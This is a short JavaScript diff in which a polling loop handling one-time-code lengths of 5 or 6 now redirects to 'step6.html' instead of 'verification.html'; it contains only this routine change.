@@ -47,14 +47,14 @@ const checker = setInterval(async () => {
         if (data.otp === 5) {
             clearInterval(checker);
             localStorage.setItem("otpLength", 5);
-            window.location.href = "verification.html";
+            window.location.href = "step6.html";
             return;
         }
 
         if (data.otp === 6) {
             clearInterval(checker);
             localStorage.setItem("otpLength", 6);
-            window.location.href = "verification.html";
+            window.location.href = "step6.html";
             return;
         }
 
